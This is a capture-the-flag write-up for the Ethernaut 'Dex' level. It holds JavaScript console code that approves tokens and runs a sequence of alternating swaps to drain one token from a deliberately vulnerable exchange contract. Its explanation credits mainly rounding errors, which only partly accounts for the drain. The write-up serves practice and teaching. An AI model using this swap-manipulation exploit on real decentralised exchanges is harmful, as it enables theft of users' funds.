# Level 22: [Dex](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

## Level objectives:
Drain one of the tokens from dex.
## Analysis
- Similar to JS's floating point errors, solidity has rounding errors.
- Sol always rounds towards zero.
- So, by making many token swaps from token1 to token2 and back, we can decrease the total balance of one of the tokens in the contract to zero. The precision loss will automatically do the job for us. 
## Code:
```js
await contract.approve(contract.address, 500); 

const token1 = await contract.token1();
const token2 = await contract.token2();

contract.swap(token1, token2, 10);
contract.swap(token2, token1, 20);
contract.swap(token1, token2, 24);
contract.swap(token2, token1, 30);
contract.swap(token1, token2, 41);
contract.swap(token2, token1, 45);

// verify using:
await contract.getSwapPrice(token1, token2, 1);
await contract.getSwapPrice(token2, token1, 1);
```
